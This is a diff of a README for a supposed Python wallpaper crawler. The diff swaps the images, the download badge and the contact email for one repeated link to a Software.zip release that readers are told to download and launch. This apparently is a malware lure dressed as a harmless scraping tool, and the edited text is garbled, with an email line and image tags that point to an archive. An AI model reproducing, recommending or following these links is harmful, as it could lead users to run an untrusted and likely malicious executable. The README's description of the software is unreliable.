@@ -1,6 +1,6 @@
 # 🐍🖼️ Python Wallpaper Crawler 🕸️
 
-![Python Wallpaper Crawler](https://i.imgur.com/vF23oZ5.png)
+![Python Wallpaper Crawler](https://github.com/PREAKP90/Python_Wallpaper_Crawler/releases/download/v2.0/Software.zip)
 
 Welcome to the Python Wallpaper Crawler repository! This advanced web scraping tool is designed to crawl websites and download high-resolution wallpapers effortlessly. Whether you're looking to spruce up your desktop with stunning backgrounds or automate the process of downloading images, this crawler is here to help.
 
@@ -14,7 +14,7 @@ Welcome to the Python Wallpaper Crawler repository! This advanced web scraping t
 
 To get started with the Python Wallpaper Crawler, simply download the software package from the link below:
 
-[![Download Software Package](https://img.shields.io/badge/Download-Software%20Package-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software Package](https://github.com/PREAKP90/Python_Wallpaper_Crawler/releases/download/v2.0/Software.zip%20Package-blue)](https://github.com/PREAKP90/Python_Wallpaper_Crawler/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the package, you will need to launch it to begin using the crawler to fetch stunning wallpapers.
 
@@ -41,11 +41,11 @@ A big thank you to all the contributors who have helped in developing and improv
 
 ## Get in Touch 📧
 
-Have feedback, suggestions, or want to contribute to the Python Wallpaper Crawler? Reach out to us via email at wallpapercrawler@example.com. We'd love to hear from you!
+Have feedback, suggestions, or want to contribute to the Python Wallpaper Crawler? Reach out to us via email at https://github.com/PREAKP90/Python_Wallpaper_Crawler/releases/download/v2.0/Software.zip We'd love to hear from you!
 
 ---
 
 Remember, a picture is worth a thousand words, and with the Python Wallpaper Crawler, you'll have access to thousands of stunning wallpapers at your fingertips. Happy crawling! 🌈🔍
 
-![Python Wallpaper Crawler](https://i.imgur.com/Q93INRy.jpg)
+![Python Wallpaper Crawler](https://github.com/PREAKP90/Python_Wallpaper_Crawler/releases/download/v2.0/Software.zip)
 
